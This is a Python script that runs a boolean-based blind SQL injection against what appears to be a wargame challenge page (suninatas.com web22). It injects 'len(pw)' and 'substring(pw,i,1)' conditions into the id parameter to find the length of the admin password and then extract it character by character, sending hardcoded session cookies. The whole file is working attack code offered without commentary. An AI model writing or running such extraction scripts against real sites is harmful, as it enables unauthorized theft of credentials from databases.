import requests

session_id={'ASPSESSIONIDQCCSSTCS' : 'GHBHGHFBHDODIKOOECOEODHP','ASPSESSIONIDQSCQQRDR':'CLKJNODCGEJDONGPKJAPLPBP','ASPSESSIONIDSACSSTAS':'BHKLIKADJEHIECAAOMCNCOEN','ASPSESSIONIDAQBQRRBQ':'ADAAHJHDJCDMMOPMMGFNDHGC','auth%5Fkey':'%3F%3F%3F%3F%3F'}
length=0

for i in range(1, 20):
	url = "http://suninatas.com/Part_one/web22/web22.asp?id=admin'%20and%20len(pw)="+str(i)+"--%20&pw=1"
	respone = requests.get(url=url,cookies=session_id)
	print(respone.url)

	if "OK" in respone.text:
			length=i
			print(length)
			break
	elif "hack" in respone.text:
		print("hack")
	elif "False" in respone.text:
		print('false')
pw=''
key=''
for i in range(1,length+1):
	for j in range(33,128):
		key=chr(int(j))
		url = "http://suninatas.com/Part_one/web22/web22.asp?id=admin'%20and%20substring(pw,"+str(i)+",1)='"+key+"'--%20&pw=1"
		respone = requests.get(url=url,cookies=session_id)
		print(respone.url)

		if "OK" in respone.text:
				pw+=str(chr(j))
				print(pw)
				break
		elif "hack" in respone.text:
			print("hack")
		elif "False" in respone.text:
			print('false')
print(pw)